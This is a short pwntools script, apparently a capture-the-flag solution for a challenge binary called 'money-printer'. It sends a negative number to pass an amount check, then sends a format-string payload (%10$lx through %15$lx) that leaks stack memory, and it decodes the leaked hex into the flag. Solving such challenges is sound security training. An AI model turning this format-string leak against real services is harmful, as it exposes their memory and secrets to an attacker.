from pwn import *

source = "money.sdc.tf"
port = 1337
binary = "./money-printer"

if args.REMOTE:
	r = remote(source, port)
else:
	r = process(binary)

if args.DEBUG:
	context.log_level = 'debug'

r.sendlineafter(b"I have 100 dollars, how many of them do you want?\n", b"-1")

payload = ""
for i in range(10, 16):
	payload += f"%{i}$lx "
log.info(f"{payload = }")

r.sendlineafter(b"the audience?\n", payload.encode())

flag_enc = r.recvline().decode().strip().split()[3:]
flag = ""
for block in flag_enc:
	flag += unhex(block).decode()[::-1]
flag += "}"

log.success(f"{flag = }")

r.close()